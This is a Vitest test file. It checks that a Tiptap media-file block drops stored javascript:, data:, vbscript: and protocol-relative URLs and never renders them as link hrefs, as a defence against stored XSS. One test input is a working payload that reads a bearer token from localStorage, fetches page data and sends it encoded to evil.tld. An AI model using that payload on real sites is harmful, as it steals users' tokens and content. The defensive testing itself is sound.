import { describe, expect, it } from "vitest";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import type { NodeViewProps } from "@tiptap/react";
import { ImageView } from "./image-block";

/**
 * B52 - stored XSS: the media "file" block renders the stored `attrs.src` as
 * an anchor `href`. A page document may carry
 * `{ type: "image", attrs: { src: "javascript:…", mediaType: "file" } }`, so
 * the stored URL has to pass the shared href allowlist before it may become a
 * link.
 *
 * These are render-level tests: the node view is rendered with a hostile
 * stored `src` and the produced markup is inspected.
 */

type Attrs = {
  src: string;
  alt: string | null;
  title: string | null;
  caption: string;
  width: number | null;
  align: unknown;
  mediaType: unknown;
};

const render = (attrs: Partial<Attrs>) =>
  renderToStaticMarkup(
    createElement(ImageView, {
      node: { attrs },
      editor: { isEditable: false },
      updateAttributes: () => {},
      deleteNode: () => {},
      selected: false,
      locale: "en",
    } as unknown as NodeViewProps & { locale: string }),
  );

describe("media file block - the stored src never becomes a javascript: href", () => {
  it("renders an app-owned file link", () => {
    const html = render({
      src: "/api/files/ws1/report.pdf",
      alt: "Report",
      mediaType: "file",
    });
    expect(html).toContain('data-testid="media-file"');
    expect(html).toContain('href="/api/files/ws1/report.pdf"');
  });

  it("drops a stored javascript: src", () => {
    const html = render({
      src: "javascript:alert(document.domain)",
      alt: "x",
      mediaType: "file",
    });
    expect(html).not.toContain("javascript:");
    expect(html).not.toContain("<a");
  });

  it("drops the payload from the finding", () => {
    const html = render({
      src:
        'javascript:fetch("/api/v1/pages",{headers:{Authorization:"Bearer "+localStorage.getItem("t")}}).then(r=>r.text()).then(t=>fetch("https://evil.tld/?d="+btoa(t)))',
      alt: "x",
      mediaType: "file",
    });
    expect(html).not.toContain("javascript:");
    expect(html).not.toContain("evil.tld");
    expect(html).not.toContain("<a");
  });

  it("drops the other script-bearing schemes too", () => {
    for (const src of [
      "data:text/html;base64,PHN2Zz4=",
      "vbscript:msgbox(1)",
      "//evil.example/x",
    ]) {
      const html = render({ src, alt: "x", mediaType: "file" });
      expect(html, src).not.toContain("<a");
    }
  });

  it("leaves an image block's src alone (an img src is inert)", () => {
    const html = render({ src: "/api/files/ws1/pic.png", alt: "pic" });
    expect(html).toContain('src="/api/files/ws1/pic.png"');
    expect(html).not.toContain("<a");
  });
});
